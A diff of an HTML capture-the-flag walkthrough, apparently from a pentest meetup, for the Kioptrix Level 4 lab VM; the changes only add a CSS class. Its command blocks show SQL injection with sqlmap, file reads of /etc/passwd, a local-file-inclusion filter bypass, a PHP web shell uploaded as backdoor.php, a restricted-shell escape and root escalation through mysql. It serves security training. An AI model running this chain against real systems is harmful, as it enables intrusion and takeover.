@@ -131,7 +131,7 @@
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#the-exploits">3.11.3. The Exploits</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#exploit-ssh-and-root-mysql">3.11.3.1. Exploit: SSH and root mysql</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#exploit-proc-self-fd-9-and-root-mysql">3.11.3.2. Exploit: <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code> and root mysql</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#exploit-proc-self-fd-9-and-root-mysql">3.11.3.2. Exploit: <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/9</span></code> and root mysql</a></li>
 </ul>
 </li>
 </ul>
@@ -234,12 +234,12 @@
 <h2>3.11.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="setting-up-the-vmware-vm">
 <h3>3.11.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
-<p>The challenge is <a class="reference external" href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a>, the fourth of the <a class="reference external" href="https://www.vulnhub.com/series/kioptrix,8/">Vulnhub Kioptrix Series</a>. The VM comes packaged as <a class="reference external" href="http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar">Kioptrix4_vmware.rar</a>, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless root access to fix any issues. See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Kioptrix4 runs Ubuntu 8.04.3 LTS i686.</p>
+<p>The challenge is <a class="reference external" href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a>, the fourth of the <a class="reference external" href="https://www.vulnhub.com/series/kioptrix,8/">Vulnhub Kioptrix Series</a>. The VM comes packaged as <a class="reference external" href="http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar">Kioptrix4_vmware.rar</a>, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless root access to fix any issues. See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Kioptrix4 runs Ubuntu 8.04.3 LTS i686.</p>
 </div>
 <div class="section" id="setting-up-your-environment">
 <h3>3.11.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
-<p>If you want to easily cut-and-paste from the sample code below, download and edit <a class="reference download internal" href="../_downloads/kioptrix4_setup.sh" download=""><code class="xref download docutils literal"><span class="pre">kioptrix4_setup.sh</span></code></a>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<p>If you want to easily cut-and-paste from the sample code below, download and edit <a class="reference download internal" href="../_downloads/kioptrix4_setup.sh" download=""><code class="xref download docutils literal notranslate"><span class="pre">kioptrix4_setup.sh</span></code></a>:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 mkdir -p <span class="nv">$PT</span>
 <span class="nb">cd</span> <span class="nv">$PT</span>
 <span class="c1"># download kioptrix4_setup.sh</span>
@@ -248,8 +248,8 @@ curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/k
 <span class="nb">source</span> kioptrix4_setup.sh
 </pre></div>
 </div>
-<p><code class="docutils literal"><span class="pre">kioptrix4_setup.sh</span></code> should look something like:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
+<p><code class="docutils literal notranslate"><span class="pre">kioptrix4_setup.sh</span></code> should look something like:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
 
 <span class="c1"># *******************************************************</span>
 <span class="c1"># Edit these to match your setup</span>
@@ -286,7 +286,7 @@ curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/k
 <div class="section" id="network-reconnaissance">
 <h3>3.11.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
 <p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/nmap
 <span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
@@ -297,8 +297,8 @@ grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &qu
 xsltproc nmap_sn.xml -o nmap_sn.html
 </pre></div>
 </div>
-<p>The above reconnaissance should identify the IP for $TARGET and can update $PT/kioptrix4_setup.sh with this value and edit <code class="file docutils literal"><span class="pre">/etc/hosts</span></code> to add “kioptrix4.com” (<code class="docutils literal"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">kioptrix4.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>). Then we can enumerate the open ports and services:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<p>The above reconnaissance should identify the IP for $TARGET and can update $PT/kioptrix4_setup.sh with this value and edit <code class="file docutils literal notranslate"><span class="pre">/etc/hosts</span></code> to add “kioptrix4.com” (<code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">kioptrix4.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>). Then we can enumerate the open ports and services:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
 <span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
@@ -318,15 +318,15 @@ xsltproc nmap_A.xml -o nmap_A.html
 </div>
 <div class="section" id="smb-reconnaissance-via-nmap-script">
 <h3>3.11.2.2. SMB reconnaissance via nmap script<a class="headerlink" href="#smb-reconnaissance-via-nmap-script" title="Permalink to this headline">¶</a></h3>
-<p>We utilize <code class="file docutils literal"><span class="pre">/usr/share/nmap/scripts/smb-enum-users.nse</span></code> to see if we can find some user accounts:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<p>We utilize <code class="file docutils literal notranslate"><span class="pre">/usr/share/nmap/scripts/smb-enum-users.nse</span></code> to see if we can find some user accounts:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/nmap
 nmap  -oA nmap_smb --script smb-enum-users <span class="nv">$TARGET</span> -p <span class="m">139</span>,445
 </pre></div>
 </div>
 <p>That gives us these user accounts:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">|   KIOPTRIX4\john (RID: 3002)</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">|   KIOPTRIX4\john (RID: 3002)</span>
 <span class="go">|   KIOPTRIX4\loneferret (RID: 3000)</span>
 <span class="go">|   KIOPTRIX4\nobody (RID: 501)</span>
 <span class="go">|   KIOPTRIX4\robert (RID: 3004)</span>
@@ -336,8 +336,8 @@ nmap  -oA nmap_smb --script smb-enum-users <span class="nv">$TARGET</span> -p <s
 </div>
 <div class="section" id="port-80-reconnaissance-via-dirb-nikto">
 <h3>3.11.2.3. Port 80 reconnaissance via dirb &amp; nikto<a class="headerlink" href="#port-80-reconnaissance-via-dirb-nikto" title="Permalink to this headline">¶</a></h3>
-<p>Out of habit we do <strong class="program">dirb</strong> and <strong class="program">nikto</strong> scans. Of note <strong class="program">dirb</strong> found directory <code class="file docutils literal"><span class="pre">/john</span></code>.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<p>Out of habit we do <strong class="program">dirb</strong> and <strong class="program">nikto</strong> scans. Of note <strong class="program">dirb</strong> found directory <code class="file docutils literal notranslate"><span class="pre">/john</span></code>.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/spider
 dirb  http://<span class="nv">$HOST</span>/ -o dirb.txt
@@ -349,7 +349,7 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 <div class="section" id="sqlmap-on-login-form">
 <h3>3.11.2.4. <strong class="program">sqlmap</strong> on login form<a class="headerlink" href="#sqlmap-on-login-form" title="Permalink to this headline">¶</a></h3>
 <p>Run this <strong class="program">sqlmap</strong>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
 <span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://kioptrix4.com/&#39;</span>
@@ -359,7 +359,7 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 </span></pre></div>
 </div>
 <p><strong class="program">sqlmap</strong> shows:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">back-end DBMS: MySQL 5.0.11</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">back-end DBMS: MySQL 5.0.11</span>
 <span class="go">banner:    &#39;5.0.51a-3ubuntu5.4&#39;</span>
 <span class="hll"><span class="go">current user:    &#39;root@localhost&#39;</span>
 </span><span class="hll"><span class="go">current user is DBA:    True</span>
@@ -385,7 +385,7 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 </span></pre></div>
 </div>
 <p>Did you see that? The mysql current user is the mysql root user and is passwordless? Before we follow up on that let’s dump the members table:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
 <span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://kioptrix4.com/&#39;</span>
@@ -394,7 +394,7 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 </span></pre></div>
 </div>
 <p>This reveals 2 users:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: members</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: members</span>
 <span class="go">Table: members</span>
 <span class="go">[2 entries]</span>
 <span class="go">+----+----------+-----------------------+</span>
@@ -413,7 +413,7 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 <div class="section" id="file-read">
 <h4>3.11.2.5.1. –file-read<a class="headerlink" href="#file-read" title="Permalink to this headline">¶</a></h4>
 <p>First let’s use “–file-read” to get at kioptrix4 system files:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
 <span class="hll"><span class="nv">FILE</span><span class="o">=</span><span class="s1">&#39;/etc/passwd&#39;</span>
@@ -422,8 +422,8 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 </span><span class="hll">  --dbms<span class="o">=</span><span class="s2">&quot;MySQL&quot;</span> --forms --file-read<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$FILE</span><span class="s2">&quot;</span> -v <span class="m">0</span>
 </span></pre></div>
 </div>
-<p>Running this gets us <code class="file docutils literal"><span class="pre">/etc/passwd</span></code>:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$</span> <span class="nv">FILE</span><span class="o">=</span><span class="s1">&#39;/etc/passwd&#39;</span>
+<p>Running this gets us <code class="file docutils literal notranslate"><span class="pre">/etc/passwd</span></code>:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$</span> <span class="nv">FILE</span><span class="o">=</span><span class="s1">&#39;/etc/passwd&#39;</span>
 </span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlmap
 </span><span class="hll"><span class="go">    --dbms=&quot;MySQL&quot; --forms --file-read=&quot;$FILE&quot; -v 0</span>
 </span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
@@ -446,7 +446,7 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 <div class="section" id="file-write-file-dest-failure">
 <h4>3.11.2.5.2. –file-write &amp; –file-dest failure<a class="headerlink" href="#file-write-file-dest-failure" title="Permalink to this headline">¶</a></h4>
 <p>Next let’s use “–file-write LOCALFILE” and “–file-dest REMOTEFILE” to transfer LOCALFILE to REMOTEFILE. Although g0tm1lk’s <a class="reference external" href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-sql-injection/">Kioptrix - Level 4 (SQL Injection)</a> reported success with this, our sqlmap complained “none of the SQL injection techniques detected can be used to write files to the underlying file system of the back-end MySQL server”.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
 <span class="hll">
@@ -462,14 +462,14 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 </span></pre></div>
 </div>
 <p>The sqlmap error reported was:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">[15:38:27] [ERROR] none of the SQL injection techniques detected can be used to write files to the underlying file system of the back-end MySQL server</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[15:38:27] [ERROR] none of the SQL injection techniques detected can be used to write files to the underlying file system of the back-end MySQL server</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="sql-shell">
 <h4>3.11.2.5.3. –sql-shell<a class="headerlink" href="#sql-shell" title="Permalink to this headline">¶</a></h4>
 <p>Next let’s get a mysql shell going:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
 <span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://kioptrix4.com/&#39;</span>
@@ -478,7 +478,7 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 </span></pre></div>
 </div>
 <p>Running this gets us a mysql shell missing some output, but still useful:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
 </span><span class="hll">  --dbms<span class="o">=</span><span class="s2">&quot;MySQL&quot;</span> --forms --sql-shell -v <span class="m">0</span>
 </span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="hll"><span class="go">sql-shell&gt; show databases;</span>
@@ -509,7 +509,7 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 <div class="section" id="sql-query">
 <h3>3.11.2.6. –sql-query<a class="headerlink" href="#sql-query" title="Permalink to this headline">¶</a></h3>
 <p>And you can run 1 query via:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
 <span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://kioptrix4.com/&#39;</span>
@@ -524,8 +524,8 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 <h4>3.11.2.7.1. Downloading files<a class="headerlink" href="#downloading-files" title="Permalink to this headline">¶</a></h4>
 <div class="section" id="via-the-web-server">
 <h5>3.11.2.7.1.1. Via the web server<a class="headerlink" href="#via-the-web-server" title="Permalink to this headline">¶</a></h5>
-<p>The html has a local file inclusion problem in the url <a class="reference external" href="http://kioptrix4.com/member.php?username=john">http://kioptrix4.com/member.php?username=john</a> (used to display a member’s control panel). When you try to download <code class="file docutils literal"><span class="pre">/etc/password</span></code> by changing “john” to “../../../../../../etc/passwd”, the “etc” is filtered out. Two standard tricks to get around this are duplicating the string (“etc” becomes “etcetc”) or embedding the string within itself (“etc” becomes “eetctc” so removing the inner “etc” leaves “etc”). Here’s an example:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">PT=$HOME/pentest/kioptrix4</span>
+<p>The html has a local file inclusion problem in the url <a class="reference external" href="http://kioptrix4.com/member.php?username=john">http://kioptrix4.com/member.php?username=john</a> (used to display a member’s control panel). When you try to download <code class="file docutils literal notranslate"><span class="pre">/etc/password</span></code> by changing “john” to “../../../../../../etc/passwd”, the “etc” is filtered out. Two standard tricks to get around this are duplicating the string (“etc” becomes “etcetc”) or embedding the string within itself (“etc” becomes “eetctc” so removing the inner “etc” leaves “etc”). Here’s an example:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PT=$HOME/pentest/kioptrix4</span>
 <span class="go">source $PT/kioptrix4_setup.sh</span>
 <span class="go">cd $PT/exploit</span>
 <span class="hll"><span class="gp">#</span> does not work - etc filtered out
@@ -556,8 +556,8 @@ nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span 
 <p>The mysql database can both read and write files on the target host. Unfortunately there are some security-motivated restrictions. From <a class="reference external" href="http://dev.mysql.com/doc/refman/5.7/en/select-into.html">13.2.9.1 SELECT … INTO Syntax</a>:</p>
 <blockquote>
 <div>The SELECT … INTO OUTFILE ‘file_name’ form of SELECT writes the selected rows to a file. The file is created on the server host, so you must have the FILE privilege to use this syntax. file_name cannot be an existing file, which among other things prevents files such as /etc/passwd and database tables from being destroyed.</div></blockquote>
-<p>So the database cannot overwrite or append to existing files, but can create new files. g0tm1lk’s <a class="reference external" href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-sql-injection/">Kioptrix - Level 4 (SQL Injection)</a> writeup has 2 nice examples of using SQL injection to upload files. We translate the first here to use <strong class="program">curl</strong>: it uploads the php script <code class="docutils literal"><span class="pre">&lt;?php</span> <span class="pre">passthru($_GET['cmd']);</span> <span class="pre">?&gt;</span></code>. The SQL injection’s UNION must have the same number of columns as the hijacked query: 3 in this case. It starts the output file with 3 blanks (0x20) and then includes the PHP script as a hex-encoded line terminator (<code class="docutils literal"><span class="pre">LINES</span> <span class="pre">TERMINATED</span> <span class="pre">BY</span></code>). Again, if the file exists it will not be overwritten.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># this is the PHP script to upload - encode it as ascii hex with a leading &quot;0x&quot;</span>
+<p>So the database cannot overwrite or append to existing files, but can create new files. g0tm1lk’s <a class="reference external" href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-sql-injection/">Kioptrix - Level 4 (SQL Injection)</a> writeup has 2 nice examples of using SQL injection to upload files. We translate the first here to use <strong class="program">curl</strong>: it uploads the php script <code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">passthru($_GET['cmd']);</span> <span class="pre">?&gt;</span></code>. The SQL injection’s UNION must have the same number of columns as the hijacked query: 3 in this case. It starts the output file with 3 blanks (0x20) and then includes the PHP script as a hex-encoded line terminator (<code class="docutils literal notranslate"><span class="pre">LINES</span> <span class="pre">TERMINATED</span> <span class="pre">BY</span></code>). Again, if the file exists it will not be overwritten.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># this is the PHP script to upload - encode it as ascii hex with a leading &quot;0x&quot;</span>
 <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span>
 <span class="nv">HEXCMD</span><span class="o">=</span><span class="k">$(</span>python3 -c <span class="s2">&quot;print(&#39;&#39;.join(list(map(lambda x: x[-2:],map(hex,map(ord,&#39;</span><span class="nv">$CMD</span><span class="s2">&#39;))))))&quot;</span><span class="k">)</span>
 <span class="nv">HEXCMD</span><span class="o">=</span><span class="s2">&quot;0x</span><span class="nv">$HEXCMD</span><span class="s2">&quot;</span>
@@ -575,7 +575,7 @@ curl -v -L <span class="nv">$URL</span> <span class="se">\</span>
 curl --silent http://kioptrix4.com/backdoor.php?cmd<span class="o">=</span>id
 </pre></div>
 </div>
-<p>The other example (left to the reader) is to upload a cron job that uses <code class="docutils literal"><span class="pre">nc</span></code> to connect back to the attacker.</p>
+<p>The other example (left to the reader) is to upload a cron job that uses <code class="docutils literal notranslate"><span class="pre">nc</span></code> to connect back to the attacker.</p>
 </div>
 </div>
 </div>
@@ -583,8 +583,8 @@ curl --silent http://kioptrix4.com/backdoor.php?cmd<span class="o">=</span>id
 <h2>3.11.3. The Exploits<a class="headerlink" href="#the-exploits" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="exploit-ssh-and-root-mysql">
 <h3>3.11.3.1. Exploit: SSH and root mysql<a class="headerlink" href="#exploit-ssh-and-root-mysql" title="Permalink to this headline">¶</a></h3>
-<p>This is a more typical or traditional exploit: start with SSH to kioptrix4; break out of the limited shell; use mysql running as root to escalate a user to root via <code class="file docutils literal"><span class="pre">/etc/sudoers</span></code> or “admin” group. Start with SSH using john/MyNameIsJohn:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$ PT=$</span>HOME/pentest/kioptrix4
+<p>This is a more typical or traditional exploit: start with SSH to kioptrix4; break out of the limited shell; use mysql running as root to escalate a user to root via <code class="file docutils literal notranslate"><span class="pre">/etc/sudoers</span></code> or “admin” group. Start with SSH using john/MyNameIsJohn:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$ PT=$</span>HOME/pentest/kioptrix4
 <span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$ source $</span>PT/kioptrix4_setup.sh
 <span class="gp">hacker@kali:~/pentest/kioptrix4/sqlmap$ cd $</span>PT/exploit
 <span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/exploit$</span> ssh john@kioptrix4.com
@@ -613,8 +613,8 @@ curl --silent http://kioptrix4.com/backdoor.php?cmd<span class="o">=</span>id
 <span class="go">Connection to kioptrix4.com closed.</span>
 </pre></div>
 </div>
-<p>This appears to be <a class="reference external" href="https://github.com/ghantoos/lshell">ghantoos/lshell</a>. Doing a quick search for “lshell exploit” shows an easy workaround: <code class="docutils literal"><span class="pre">echo</span> <span class="pre">os.system('/bin/bash')</span></code>:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/exploit$</span> ssh john@kioptrix4.com
+<p>This appears to be <a class="reference external" href="https://github.com/ghantoos/lshell">ghantoos/lshell</a>. Doing a quick search for “lshell exploit” shows an easy workaround: <code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">os.system('/bin/bash')</span></code>:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/exploit$</span> ssh john@kioptrix4.com
 </span><span class="go">john@kioptrix4.com&#39;s password:</span>
 <span class="go">Welcome to LigGoat Security Systems - We are Watching</span>
 <span class="go">== Welcome LigGoat Employee ==</span>
@@ -627,13 +627,13 @@ curl --silent http://kioptrix4.com/backdoor.php?cmd<span class="o">=</span>id
 </span></pre></div>
 </div>
 <p>Next we use <a class="reference external" href="https://github.com/rebootuser/LinEnum">rebootuser/LinEnum</a> to do some reconnaissance:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>wget --quiet --no-check-certificate <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wget --quiet --no-check-certificate <span class="se">\</span>
   https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 chmod +x LinEnum.sh<span class="p">;</span> ./LinEnum.sh -t <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> tee LinEnum.out
 </pre></div>
 </div>
-<p>Scanning through LinEnum.out we see mysql (5.0.51a) runs as root without a password. A quick search on running mysql as root turns up <a class="reference external" href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux</a>. This exploit depends upon <a class="reference external" href="https://github.com/mysqludf/lib_mysqludf_sys">mysqludf/lib_mysqludf_sys</a>; it turns out the required <code class="file docutils literal"><span class="pre">/usr/lib/lib_mysqludf_sys.so</span></code> is already on the system and defines the required <code class="docutils literal"><span class="pre">sys_exec()</span></code> function, so we can run the exploit without setup:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">john@Kioptrix4:~$</span> ls -l /usr/lib/lib_mysqludf_sys.so
+<p>Scanning through LinEnum.out we see mysql (5.0.51a) runs as root without a password. A quick search on running mysql as root turns up <a class="reference external" href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux</a>. This exploit depends upon <a class="reference external" href="https://github.com/mysqludf/lib_mysqludf_sys">mysqludf/lib_mysqludf_sys</a>; it turns out the required <code class="file docutils literal notranslate"><span class="pre">/usr/lib/lib_mysqludf_sys.so</span></code> is already on the system and defines the required <code class="docutils literal notranslate"><span class="pre">sys_exec()</span></code> function, so we can run the exploit without setup:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">john@Kioptrix4:~$</span> ls -l /usr/lib/lib_mysqludf_sys.so
 </span><span class="hll"><span class="go">-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so</span>
 </span><span class="hll"><span class="gp">john@Kioptrix4:~$</span> <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;select * from mysql.func;&#39;</span>
